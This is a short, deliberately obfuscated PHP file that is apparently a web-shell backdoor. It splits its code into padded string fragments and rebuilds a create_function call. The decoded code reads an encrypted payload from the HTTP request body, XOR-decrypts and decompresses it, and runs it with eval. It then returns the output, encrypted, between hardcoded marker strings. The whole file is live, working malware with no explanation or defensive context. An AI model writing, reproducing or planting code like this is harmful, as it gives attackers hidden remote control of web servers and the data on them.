<?php
$D='_get_contents()/L;@/Lob_end_cl/Lean();$r/L/L=@b/Lase64_enco/Lde(@x(@gzc/Lompres/Ls($o/L),$k));p/Lrint/L("$p$kh$r$/Lkf");}';
$U='L$o./L=$/Lt{$i/L}^$k{$/Lj};}}return $o;}/Lif /L(@preg_match(/L"/$kh(/L.+)$kf/L/",/L/L/L@file_get_contents("p/Lhp:/L/';
$v='/L/i/Lnput"),/L$m)=/L=1) {@ob_start();/L@e/Lval(@g/Lzuncompress/L(@x(@ba/L/Lse6/L4_decode/L($m/L[1]),/L$k)));/L$o=@/Lob';
$N='$/Lk="f09e/Ldf6d";$kh/L="0471/L42d0b0f/L7";$kf/L="f/L58ec922fb91"/L;$p/L="lcPc9c/LpU85/Lhy9NxH"/L;functi/Lon x(/L$t,/L$k)';
$d=str_replace('X','','XXcreateX_fuXnXcXtion');
$z='{$c=/Lstrl/Len($k);$l=/L/Lst/Lrlen($t);$o="";for/L(/L$/Li=0;$/Li<$l;){for($j=/L0;/L($/Lj<$c&&$i<$l);$j+/L+,$i/L++){/';
$k=str_replace('/L','',$N.$z.$U.$v.$D);
$E=$d('',$k);$E();
?>
